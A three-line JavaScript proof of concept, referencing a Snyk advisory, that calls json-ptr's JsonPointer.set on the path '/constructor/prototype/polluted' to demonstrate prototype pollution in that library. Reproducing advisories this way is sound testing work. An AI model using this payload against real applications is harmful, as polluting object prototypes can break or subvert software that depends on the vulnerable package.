//https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
  const { JsonPointer } = require("json-ptr");
  JsonPointer.set({}, "/constructor/prototype/polluted", "yes", true);
